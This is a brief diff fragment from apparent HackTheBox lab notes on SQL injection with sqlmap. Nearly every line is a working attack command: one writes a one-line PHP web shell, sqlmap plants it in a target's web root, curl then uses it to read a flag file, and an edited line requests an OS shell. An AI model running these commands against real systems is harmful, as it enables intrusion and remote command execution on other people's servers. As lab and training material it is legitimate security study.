@@ -153,7 +153,7 @@ echo '<?php system($_GET["cmd"]); ?>'
 sudo chmod +x shell.php
 sqlmap -u "http://94.237.62.37:45885/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
 curl http://94.237.62.37:45885/shell.php?cmd=cat+../../../flag.txt
-[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell
+[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
 ```
 
 ## Skills Assessment
